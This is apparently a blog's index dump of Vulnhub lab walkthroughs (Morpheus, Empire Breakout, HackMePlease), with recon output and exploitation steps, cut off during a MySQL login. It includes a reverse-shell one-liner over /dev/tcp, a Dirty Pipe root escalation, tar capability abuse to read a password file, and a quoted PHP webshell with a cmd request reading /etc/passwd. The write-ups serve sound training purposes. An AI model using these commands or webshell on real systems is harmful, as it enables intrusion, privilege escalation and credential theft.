www-data www-data 31 Nov 15 05:41 shell.php -rw-r--r-- 1 www-data www-data 44297 Oct 28 2021 trinity.jpeg www-data@morpheus:/var/www/html$ chmod +x dirty_pipe.sh chmod +x dirty_pipe.sh www-data@morpheus:/var/www/html$ ./dirty_pipe.sh ./dirty_pipe.sh /etc/passwd已备份到/tmp/passwd It worked! # 恢复原来的密码 rm -rf /etc/passwd mv /tmp/passwd /etc/passwd root@morpheus:/var/www/html# id id uid=0(root) gid=0(root) groups=0(root) root@morpheus:/var/www/html# ls /root ls /root FLAG.txt root@morpheus:/var/www/html# cat /root/FLAG.txt cat /root/FLAG.txt You've won! Let's hope Matrix: Resurrections rocks! ","date":"2023-11-12","objectID":"/2023/11/vulnhub_walkthrough-matrix-breakout-2-morpheus/:5:0","tags":["Vulnhub"],"title":"Vulnhub Matrix-breakout-2-Morpheus","uri":"/2023/11/vulnhub_walkthrough-matrix-breakout-2-morpheus/"},{"categories":["Web"],"content":"Attack Path scann web directory –\u003e analysis php file –\u003e LFI –\u003e upload webshell –\u003e get revers shell –\u003e privilege escalation ","date":"2023-11-12","objectID":"/2023/11/vulnhub_walkthrough-matrix-breakout-2-morpheus/:6:0","tags":["Vulnhub"],"title":"Vulnhub Matrix-breakout-2-Morpheus","uri":"/2023/11/vulnhub_walkthrough-matrix-breakout-2-morpheus/"},{"categories":["Web"],"content":"Vulnhub Training -- Empire Breakout","date":"2023-11-11","objectID":"/2023/11/vulnhub_empire_breakout/","tags":["Vulnhub"],"title":"Vulnhub Empire Breakout","uri":"/2023/11/vulnhub_empire_breakout/"},{"categories":["Web"],"content":"Vulnhub Training Waklthrough – Empire Breakout ","date":"2023-11-11","objectID":"/2023/11/vulnhub_empire_breakout/:0:0","tags":["Vulnhub"],"title":"Vulnhub Empire Breakout","uri":"/2023/11/vulnhub_empire_breakout/"},{"categories":["Web"],"content":"Knowledge enum4linux – enumeration of smb service reverse shell – sh -i /dev/tcp/IP/port 0\u003e\u00261 getcap – read the file’s capability ","date":"2023-11-11","objectID":"/2023/11/vulnhub_empire_breakout/:1:0","tags":["Vulnhub"],"title":"Vulnhub Empire Breakout","uri":"/2023/11/vulnhub_empire_breakout/"},{"categories":["Web"],"content":"1. Environment Setup Download the zip file, setup the network to NAT, open with VMware. ","date":"2023-11-11","objectID":"/2023/11/vulnhub_empire_breakout/:2:0","tags":["Vulnhub"],"title":"Vulnhub Empire Breakout","uri":"/2023/11/vulnhub_empire_breakout/"},{"categories":["Web"],"content":"2. Reconnaisence ","date":"2023-11-11","objectID":"/2023/11/vulnhub_empire_breakout/:3:0","tags":["Vulnhub"],"title":"Vulnhub Empire Breakout","uri":"/2023/11/vulnhub_empire_breakout/"},{"categories":["Web"],"content":"1. IP Address arp-scan scanner: ┌──(v4ler1an㉿kali)-[~/Documents/tmp] └─$ sudo arp-scan -l [sudo] password for v4ler1an: Interface: eth0, type: EN10MB, MAC: 00:0c:29:9d:5b:9e, IPv4: 172.16.86.138 Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan) 172.16.86.1 5e:52:30:c9:b7:65 (Unknown: locally administered) 172.16.86.2 00:50:56:fd:f8:ec VMware, Inc. 172.16.86.149 00:0c:29:c7:9d:d8 VMware, Inc. 172.16.86.254 00:50:56:fa:b5:64 VMware, Inc. 8 packets received by filter, 0 packets dropped by kernel Ending arp-scan 1.10.0: 256 hosts scanned in 2.385 seconds (107.34 hosts/sec). 4 responded ","date":"2023-11-11","objectID":"/2023/11/vulnhub_empire_breakout/:3:1","tags":["Vulnhub"],"title":"Vulnhub Empire Breakout","uri":"/2023/11/vulnhub_empire_breakout/"},{"categories":["Web"],"content":"2. Port Info nmap scanner: ┌──(v4ler1an㉿kali)-[~/Documents/tmp] └─$ nmap -T4 -sC -sV -p- --open -oN nmap_scan 172.16.86.149 Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-13 06:31 EST Nmap scan report for 172.16.86.149 Host is up (0.0015s latency). Not shown: 65530 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.51 ((Debian)) |_http-title: Apache2 Debian Default Page: It works |_http-server-header: Apache/2.4.51 (Debian) 139/tcp open netbios-ssn Samba smbd 4.6.2 445/tcp open netbios-ssn Samba smbd 4.6.2 10000/tcp open http MiniServ 1.981 (Webmin httpd) |_http-title: 200 \u0026mdash; Document follows 20000/tcp open http MiniServ 1.830 (Webmin httpd) |_http-server-header: MiniServ/1.830 |_http-title: 200 \u0026mdash; Document follows Host script results: | smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required | smb2-time: | date: 2023-11-13T11:31:32 |_ start_date: N/A |_nbstat: NetBIOS name: BREAKOUT, NetBIOS user: \u003cunknown\u003e, NetBIOS MAC: \u003cunknown\u003e (unknown) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 47.05 seconds Enabled port: port service 80 http web 139 smb 445 smb 10000 Webmin 1.981 20000 Webmin 1.830 Access the web page, we get the info in the bottom of page: It’s brainfuck encoded, decode it, and we got string: .2uqPEfj3D\u003cP'a-3 Maybe it is some password. Access the 10000 and 20000 port, it is two login page, need username and password: ","date":"2023-11-11","objectID":"/2023/11/vulnhub_empire_breakout/:3:2","tags":["Vulnhub"],"title":"Vulnhub Empire Breakout","uri":"/2023/11/vulnhub_empire_breakout/"},{"categories":["Web"],"content":"3. Web Directory Consider list the web directory: ┌──(v4ler1an㉿kali)-[~/Documents/tmp] └─$ gobuster dir -u http://172.16.86.149:80/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://172.16.86.149:80/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /manual (Status: 301) [Size: 315] [--\u003e http://172.16.86.149/manual/] /server-status (Status: 403) [Size: 278] Progress: 220560 / 220561 (100.00%) =============================================================== Finished =============================================================== Nothing found. ","date":"2023-11-11","objectID":"/2023/11/vulnhub_empire_breakout/:3:3","tags":["Vulnhub"],"title":"Vulnhub Empire Breakout","uri":"/2023/11/vulnhub_empire_breakout/"},{"categories":["Web"],"content":"3. Exploit ","date":"2023-11-11","objectID":"/2023/11/vulnhub_empire_breakout/:4:0","tags":["Vulnhub"],"title":"Vulnhub Empire Breakout","uri":"/2023/11/vulnhub_empire_breakout/"},{"categories":["Web"],"content":"1. Enumeration The target has smb service, so enumerate it with enum4linux: ┌──(v4ler1an㉿kali)-[/usr/share/seclists/Discovery/Web-Content] └─$ enum4linux -a 172.16.86.149 perl: warning: Setting locale failed. perl: warning: Please check that your locale settings: LANGUAGE = (unset), LC_ALL = (unset), LC_CTYPE = \"UTF-8\", LC_TERMINAL = \"iTerm2\", LANG = (unset) are supported and installed on your system. perl: warning: Falling back to the standard locale (\"C\"). Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Nov 13 06:24:30 2023 =========================================( Target Information )========================================= Target ........... 172.16.86.149 RID Range ........ 500-550,1000-1050 Username ......... '' Password ......... '' Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none ===========================( Enumerating Workgroup/Domain on 172.16.86.149 )=========================== [+] Got domain/workgroup name: WORKGROUP ... ... ==================( Users on 172.16.86.149 via RID cycling (RIDS: 500-550,1000-1050) )================== [I] Found new SID: S-1-22-1 [I] Found new SID: S-1-5-32 [I] Found new SID: S-1-5-32 [I] Found new SID: S-1-5-32 [I] Found new SID: S-1-5-32 [+] Enumerating users using SID S-1-5-32 and logon username '', password '' S-1-5-32-544 BUILTIN\\Administrators (Local Group) S-1-5-32-545 BUILTIN\\Users (Local Group) S-1-5-32-546 BUILTIN\\Guests (Local Group) S-1-5-32-547 BUILTIN\\Power Users (Local Group) S-1-5-32-548 BUILTIN\\Account Operators (Local Group) S-1-5-32-549 BUILTIN\\Server Operators (Local Group) S-1-5-32-550 BUILTIN\\Print Operators (Local Group) [+] Enumerating users using SID S-1-22-1 and logon username '', password '' S-1-22-1-1000 Unix User\\cyber (Local User) [+] Enumerating users using SID S-1-5-21-1683874020-4104641535-3793993001 and logon username '', password '' S-1-5-21-1683874020-4104641535-3793993001-501 BREAKOUT\\nobody (Local User) S-1-5-21-1683874020-4104641535-3793993001-513 BREAKOUT\\None (Domain Group) ===============================( Getting printer info for 172.16.86.149 )=============================== No printers returned. enum4linux complete on Mon Nov 13 06:25:06 2023 And we got a user named cyber. Now, we use the cyber/.2uqPEfj3D\u003cP'a-3 to try to login webmin, and we can login sucess in 20000 port, and we can get a shell: ","date":"2023-11-11","objectID":"/2023/11/vulnhub_empire_breakout/:4:1","tags":["Vulnhub"],"title":"Vulnhub Empire Breakout","uri":"/2023/11/vulnhub_empire_breakout/"},{"categories":["Web"],"content":"2. Stabilish Shell We can get a reverse shell follow the command: And then, we can stabilish it with the method: export TERM=xterm python3 -c \"import pty;pty.spawn('/bin/bash')\" (press CTRL+Z) stty raw -echo;fg;reset ","date":"2023-11-11","objectID":"/2023/11/vulnhub_empire_breakout/:4:2","tags":["Vulnhub"],"title":"Vulnhub Empire Breakout","uri":"/2023/11/vulnhub_empire_breakout/"},{"categories":["Web"],"content":"4. Privilege Escalation There is a tar file in cyber directory, and it’s privilege is root: cyber@breakout:~$ ls -la tar -rwxr-xr-x 1 root root 531928 Oct 19 2021 tar And then, we can doing a little bit of enumeration on the machine, we can see that there is a old_pass.bak file located in /var/backups but we don’t have the required permissions to view the file contents: cyber@breakout:/var/backups$ ls -la total 480 drwxr-xr-x 2 root root 4096 Nov 13 06:27 . drwxr-xr-x 14 root root 4096 Oct 19 2021 .. -rw-r--r-- 1 root root 40960 Nov 13 06:25 alternatives.tar.0 -rw-r--r-- 1 root root 12732 Oct 19 2021 apt.extended_states.0 -rw-r--r-- 1 root root 0 Nov 13 06:25 dpkg.arch.0 -rw-r--r-- 1 root root 186 Oct 19 2021 dpkg.diversions.0 -rw-r--r-- 1 root root 135 Oct 19 2021 dpkg.statoverride.0 -rw-r--r-- 1 root root 413488 Oct 19 2021 dpkg.status.0 -rw------- 1 root root 17 Oct 20 2021 .old_pass.bak cyber@breakout:/var/backups$ cat .old_pass.bak cat: .old_pass.bak: Permission denied return the tar file, it has the unnomal capability, learn capabilities more at here. Just check it: cyber@breakout:~$ getcap tar tar cap_dac_read_search=ep The capability of tar file is cap_dac_read_search, It means that it can read all the files on the system irrespective of their permissions. We can compress the contents of the old_pass.bak file in a tarball and then extract it. This should provide us the the required permissions to view the contents of the file. cyber@breakout:~$ ./tar -cf pass.tar /var/backups/.old_pass.bak ./tar: Removing leading `/' from member names cyber@breakout:~$ ls -la total 580 drwxr-xr-x 8 cyber cyber 4096 Nov 13 07:05 . drwxr-xr-x 3 root root 4096 Oct 19 2021 .. -rw------- 1 cyber cyber 0 Oct 20 2021 .bash_history -rw-r--r-- 1 cyber cyber 220 Oct 19 2021 .bash_logout -rw-r--r-- 1 cyber cyber 3526 Oct 19 2021 .bashrc drwxr-xr-x 2 cyber cyber 4096 Oct 19 2021 .filemin drwx------ 2 cyber cyber 4096 Oct 19 2021 .gnupg drwxr-xr-x 3 cyber cyber 4096 Oct 19 2021 .local -rw-r--r-- 1 cyber cyber 10240 Nov 13 07:05 pass.tar -rw-r--r-- 1 cyber cyber 807 Oct 19 2021 .profile drwx------ 2 cyber cyber 4096 Oct 19 2021 .spamassassin -rwxr-xr-x 1 root root 531928 Oct 19 2021 tar drwxr-xr-x 2 cyber cyber 4096 Oct 20 2021 .tmp drwx------ 17 cyber cyber 4096 Nov 13 06:35 .usermin -rw-r--r-- 1 cyber cyber 48 Oct 19 2021 user.txt cyber@breakout:~$ ls pass.tar tar user.txt cyber@breakout:~$ tar -xf ./pass.tar cyber@breakout:~$ ls pass.tar tar user.txt var cyber@breakout:~$ cat var/backups/.old_pass.bak Ts\u00264\u0026YurgtRX(=~h And then switch to root: cyber@breakout:~$ su Password: root@breakout:/home/cyber# id uid=0(root) gid=0(root) groups=0(root) root@breakout:/home/cyber# ls -la /root total 40 drwx------ 6 root root 4096 Oct 20 2021 . drwxr-xr-x 18 root root 4096 Oct 19 2021 .. -rw------- 1 root root 281 Oct 20 2021 .bash_history -rw-r--r-- 1 root root 571 Apr 10 2021 .bashrc drwxr-xr-x 3 root root 4096 Oct 19 2021 .local -rw-r--r-- 1 root root 161 Jul 9 2019 .profile -rw-r--r-- 1 root root 100 Oct 19 2021 rOOt.txt drwx------ 2 root root 4096 Oct 19 2021 .spamassassin drwxr-xr-x 2 root root 4096 Oct 19 2021 .tmp drwx------ 6 root root 4096 Oct 19 2021 .usermin root@breakout:/home/cyber# cat /root/rOOt.txt 3mp!r3{You_Manage_To_BreakOut_From_My_System_Congratulation} Author: Icex64 \u0026 Empire Cybersecurity ","date":"2023-11-11","objectID":"/2023/11/vulnhub_empire_breakout/:5:0","tags":["Vulnhub"],"title":"Vulnhub Empire Breakout","uri":"/2023/11/vulnhub_empire_breakout/"},{"categories":["Web"],"content":"Notes","date":"2023-11-11","objectID":"/2023/11/vulnhub_empire_breakout/:6:0","tags":["Vulnhub"],"title":"Vulnhub Empire Breakout","uri":"/2023/11/vulnhub_empire_breakout/"},{"categories":["Web"],"content":"Vulnhub Training -- HackMePlease","date":"2023-11-11","objectID":"/2023/11/vulnhub_empire_hackmeplease/","tags":["Vulnhub"],"title":"Vulnhub HackMePlease","uri":"/2023/11/vulnhub_empire_hackmeplease/"},{"categories":["Web"],"content":"Vulnhub Training Walkthrough – HackMePlease ","date":"2023-11-11","objectID":"/2023/11/vulnhub_empire_hackmeplease/:0:0","tags":["Vulnhub"],"title":"Vulnhub HackMePlease","uri":"/2023/11/vulnhub_empire_hackmeplease/"},{"categories":["Web"],"content":"Knowledge js information conf file search mysql search ","date":"2023-11-11","objectID":"/2023/11/vulnhub_empire_hackmeplease/:1:0","tags":["Vulnhub"],"title":"Vulnhub HackMePlease","uri":"/2023/11/vulnhub_empire_hackmeplease/"},{"categories":["Web"],"content":"1. Environment Setup Download the target rar file, unrar and import into VMware. ","date":"2023-11-11","objectID":"/2023/11/vulnhub_empire_hackmeplease/:2:0","tags":["Vulnhub"],"title":"Vulnhub HackMePlease","uri":"/2023/11/vulnhub_empire_hackmeplease/"},{"categories":["Web"],"content":"2. Reconnaisence ","date":"2023-11-11","objectID":"/2023/11/vulnhub_empire_hackmeplease/:3:0","tags":["Vulnhub"],"title":"Vulnhub HackMePlease","uri":"/2023/11/vulnhub_empire_hackmeplease/"},{"categories":["Web"],"content":"1. IP Address arp-scan get ip address: ┌──(v4ler1an㉿kali)-[~] └─$ sudo arp-scan -l [sudo] password for v4ler1an: Interface: eth0, type: EN10MB, MAC: 00:0c:29:9d:5b:9e, IPv4: 172.16.86.138 WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan) 172.16.86.1 5e:52:30:c9:b7:65 (Unknown: locally administered) 172.16.86.2 00:50:56:fd:f8:ec (Unknown) 172.16.86.150 00:0c:29:5c:d6:04 (Unknown) 172.16.86.254 00:50:56:f7:44:1e (Unknown) 8 packets received by filter, 0 packets dropped by kernel Ending arp-scan 1.10.0: 256 hosts scanned in 2.232 seconds (114.70 hosts/sec). 4 responded ","date":"2023-11-11","objectID":"/2023/11/vulnhub_empire_hackmeplease/:3:1","tags":["Vulnhub"],"title":"Vulnhub HackMePlease","uri":"/2023/11/vulnhub_empire_hackmeplease/"},{"categories":["Web"],"content":"2. Port Info nmap get port and service information: ┌──(v4ler1an㉿kali)-[~] └─$ nmap -p- -sV -sC 172.16.86.150 --open Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-13 22:11 EST ┌──(v4ler1an㉿kali)-[~] └─$ nmap -T4 -p- -sV -sC 172.16.86.150 --open Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-13 22:11 EST Nmap scan report for 172.16.86.150 Host is up (0.0011s latency). Not shown: 65532 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-title: Welcome to the land of pwnland |_http-server-header: Apache/2.4.41 (Ubuntu) 3306/tcp open mysql MySQL 8.0.25-0ubuntu0.20.04.1 |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=MySQL_Server_8.0.25_Auto_Generated_Server_Certificate | Not valid before: 2021-07-03T00:33:15 |_Not valid after: 2031-07-01T00:33:15 | mysql-info: | Protocol: 10 | Version: 8.0.25-0ubuntu0.20.04.1 | Thread ID: 44 | Capabilities flags: 65535 | Some Capabilities: Support41Auth, Speaks41ProtocolOld, SupportsTransactions, DontAllowDatabaseTableColumn, IgnoreSpaceBeforeParenthesis, ConnectWithDatabase, SupportsLoadDataLocal, LongColumnFlag, InteractiveClient, SwitchToSSLAfterHandshake, SupportsCompression, Speaks41ProtocolNew, FoundRows, LongPassword, IgnoreSigpipes, ODBCClient, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins | Status: Autocommit | Salt: GoAEc\\x05_7@yr\\x0C:usjD6d+ |_ Auth Plugin Name: caching_sha2_password 33060/tcp open mysqlx? | fingerprint-strings: | DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: | Invalid message\" | HY000 | LDAPBindReq: | *Parse error unserializing protobuf message\" | HY000 | oracle-tns: | Invalid message-frame.\" |_ HY000 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port33060-TCP:V=7.94SVN%I=7%D=11/13%Time=6552E561%P=x86_64-pc-linux-gnu SF:%r(NULL,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(GenericLines,9,\"\\x05\\0\\0\\0\\ SF:x0b\\x08\\x05\\x1a\\0\")%r(GetRequest,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(HT SF:TPOptions,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(RTSPRequest,9,\"\\x05\\0\\0\\0 SF:\\x0b\\x08\\x05\\x1a\\0\")%r(RPCCheck,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(DNS SF:VersionBindReqTCP,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(DNSStatusRequestT SF:CP,2B,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\\x1e\\0\\0\\0\\x01\\x08\\x01\\x10\\x88'\\x1a\\ SF:x0fInvalid\\x20message\\\"\\x05HY000\")%r(Help,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a SF:\\0\")%r(SSLSessionReq,2B,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\\x1e\\0\\0\\0\\x01\\x08 SF:\\x01\\x10\\x88'\\x1a\\x0fInvalid\\x20message\\\"\\x05HY000\")%r(TerminalServerCo SF:okie,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(TLSSessionReq,2B,\"\\x05\\0\\0\\0\\x SF:0b\\x08\\x05\\x1a\\0\\x1e\\0\\0\\0\\x01\\x08\\x01\\x10\\x88'\\x1a\\x0fInvalid\\x20messa SF:ge\\\"\\x05HY000\")%r(Kerberos,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(SMBProgN SF:eg,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(X11Probe,2B,\"\\x05\\0\\0\\0\\x0b\\x08\\ SF:x05\\x1a\\0\\x1e\\0\\0\\0\\x01\\x08\\x01\\x10\\x88'\\x1a\\x0fInvalid\\x20message\\\"\\x0 SF:5HY000\")%r(FourOhFourRequest,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(LPDStr SF:ing,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(LDAPSearchReq,2B,\"\\x05\\0\\0\\0\\x0 SF:b\\x08\\x05\\x1a\\0\\x1e\\0\\0\\0\\x01\\x08\\x01\\x10\\x88'\\x1a\\x0fInvalid\\x20messag SF:e\\\"\\x05HY000\")%r(LDAPBindReq,46,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\x009\\0\\0\\0\\ SF:x01\\x08\\x01\\x10\\x88'\\x1a\\*Parse\\x20error\\x20unserializing\\x20protobuf\\x SF:20message\\\"\\x05HY000\")%r(SIPOptions,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r SF:(LANDesk-RC,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(TerminalServer,9,\"\\x05\\ SF:0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(NCP,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(Not SF:esRPC,2B,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\\x1e\\0\\0\\0\\x01\\x08\\x01\\x10\\x88'\\x SF:1a\\x0fInvalid\\x20message\\\"\\x05HY000\")%r(JavaRMI,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x SF:05\\x1a\\0\")%r(WMSRequest,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(oracle-tns, SF:32,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0%\\0\\0\\0\\x01\\x08\\x01\\x10\\x88'\\x1a\\x16Inv SF:alid\\x20message-frame\\.\\\"\\x05H","date":"2023-11-11","objectID":"/2023/11/vulnhub_empire_hackmeplease/:3:2","tags":["Vulnhub"],"title":"Vulnhub HackMePlease","uri":"/2023/11/vulnhub_empire_hackmeplease/"},{"categories":["Web"],"content":"3. Web Directory Well, just scan the web directory: ┌──(v4ler1an㉿kali)-[~] └─$ gobuster dir -u http://172.16.86.150:80/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://172.16.86.150:80/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /img (Status: 301) [Size: 312] [--\u003e http://172.16.86.150/img/] /css (Status: 301) [Size: 312] [--\u003e http://172.16.86.150/css/] /js (Status: 301) [Size: 311] [--\u003e http://172.16.86.150/js/] /fonts (Status: 301) [Size: 314] [--\u003e http://172.16.86.150/fonts/] /server-status (Status: 403) [Size: 278] Progress: 220560 / 220561 (100.00%) =============================================================== Finished =============================================================== Just find some common directory. Look into js directory, maybe we can find some userful js file: ┌──(v4ler1an㉿kali)-[~] └─$ gobuster dir -u http://172.16.86.150:80/js/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .js,.txt -t 60 =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://172.16.86.150:80/js/ [+] Method: GET [+] Threads: 60 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Extensions: js,txt [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /main.js (Status: 200) [Size: 2997] /plugins.js (Status: 200) [Size: 126889] /vendor (Status: 301) [Size: 318] [--\u003e http://172.16.86.150/js/vendor/] Progress: 661680 / 661683 (100.00%) =============================================================== Finished =============================================================== We can see a vendor directory and main.js and plugins.js. Access them, and can find something useful in main.js: We got a path named /seeddms51x/seeddms-5.1.22/, access it: Well, it looks like a CMS named SeedDMS ’s login page. ","date":"2023-11-11","objectID":"/2023/11/vulnhub_empire_hackmeplease/:3:3","tags":["Vulnhub"],"title":"Vulnhub HackMePlease","uri":"/2023/11/vulnhub_empire_hackmeplease/"},{"categories":["Web"],"content":"3. Exploit Search exploit about SeedDMS: ┌──(v4ler1an㉿kali)-[~/Documents/tmp] └─$ sudosearchsploit -t seeddms ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Seeddms 5.1.10 - Remote Command Execution (RCE) (Authenticated) | php/webapps/50062.py SeedDMS 5.1.18 - Persistent Cross-Site Scripting | php/webapps/48324.txt SeedDMS \u003c 5.1.11 - 'out.GroupMgr.php' Cross-Site Scripting | php/webapps/47024.txt SeedDMS \u003c 5.1.11 - 'out.UsrMgr.php' Cross-Site Scripting | php/webapps/47023.txt SeedDMS versions \u003c 5.1.11 - Remote Command Execution | php/webapps/47022.txt ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results Papers: No Results ┌──(v4ler1an㉿kali)-[~/Documents/tmp] └─$ searchsploit -x php/webapps/47022.txt Exploit: SeedDMS versions \u003c 5.1.11 - Remote Command Execution URL: https://www.exploit-db.com/exploits/47022 Path: /usr/share/exploitdb/exploits/php/webapps/47022.txt Codes: CVE-2019-12744 Verified: False File Type: ASCII text ┌──(v4ler1an㉿kali)-[~/Documents/tmp] └─$ cat /usr/share/exploitdb/exploits/php/webapps/47022.txt # Exploit Title: [Remote Command Execution through Unvalidated File Upload in SeedDMS versions \u003c5.1.11] # Google Dork: [NA] # Date: [20-June-2019] # Exploit Author: [Nimit Jain](https://www.linkedin.com/in/nimitiitk)(https://secfolks.blogspot.com) # Vendor Homepage: [https://www.seeddms.org] # Software Link: [https://sourceforge.net/projects/seeddms/files/] # Version: [SeedDMS versions \u003c5.1.11] (REQUIRED) # Tested on: [NA] # CVE : [CVE-2019-12744] Exploit Steps: Step 1: Login to the application and under any folder add a document. Step 2: Choose the document as a simple php backdoor file or any backdoor/webshell could be used. PHP Backdoor Code: \u003c?php if(isset($_REQUEST['cmd'])){ echo \"\u003cpre\u003e\"; $cmd = ($_REQUEST['cmd']); system($cmd); echo \"\u003c/pre\u003e\"; die; } ?\u003e Step 3: Now after uploading the file check the document id corresponding to the document. Step 4: Now go to example.com/data/1048576/\"document_id\"/1.php?cmd=cat+/etc/passwd to get the command response in browser. Note: Here \"data\" and \"1048576\" are default folders where the uploaded files are getting saved. If we want to use the exploit, we need to login the website. But we have no passwd now. ","date":"2023-11-11","objectID":"/2023/11/vulnhub_empire_hackmeplease/:4:0","tags":["Vulnhub"],"title":"Vulnhub HackMePlease","uri":"/2023/11/vulnhub_empire_hackmeplease/"},{"categories":["Web"],"content":"1. Scan the web path We has found a url path named /seeddms51x/seeddms-5.1.22/, so we can scan it now: ┌──(v4ler1an㉿kali)-[~/Documents/tmp] └─$ gobuster dir -u http://172.16.86.150/seeddms51x/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 60 =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://172.16.86.150/seeddms51x/ [+] Method: GET [+] Threads: 60 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /data (Status: 301) [Size: 324] [--\u003e http://172.16.86.150/seeddms51x/data/] /www (Status: 301) [Size: 323] [--\u003e http://172.16.86.150/seeddms51x/www/] /conf (Status: 301) [Size: 324] [--\u003e http://172.16.86.150/seeddms51x/conf/] /pear (Status: 301) [Size: 324] [--\u003e http://172.16.86.150/seeddms51x/pear/] Progress: 220560 / 220561 (100.00%) =============================================================== Finished =============================================================== Well, we found a conf, keep scanning: ┌──(v4ler1an㉿kali)-[~/Documents/tmp] └─$ gobuster dir -u http://172.16.86.150/seeddms51x/conf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .txt,.conf,.xml,.php-t 60 =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://172.16.86.150/seeddms51x/conf [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Extensions: txt,conf,xml,php-t [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /settings.xml (Status: 200) [Size: 12377] Progress: 1102800 / 1102805 (100.00%) =============================================================== Finished =============================================================== Well, we can find mysql username and password in settings.xml file: ","date":"2023-11-11","objectID":"/2023/11/vulnhub_empire_hackmeplease/:4:1","tags":["Vulnhub"],"title":"Vulnhub HackMePlease","uri":"/2023/11/vulnhub_empire_hackmeplease/"},{"categories":["Web"],"content":"2. Login to mysql We use the username and password login to mysql, and look for something useful: ┌──(v4ler1an㉿kali)-[~/Documents/tmp] └─$ mysql -u seeddms -h 172.16.86.150 -p Enter password: Welcome to the MariaDB monitor. Commands end with ; or \\g. Your MySQL connection id is 8 Server version: 8.0.25-0ubuntu0.20.04.1 (Ubuntu) Copyright (c) 2000, 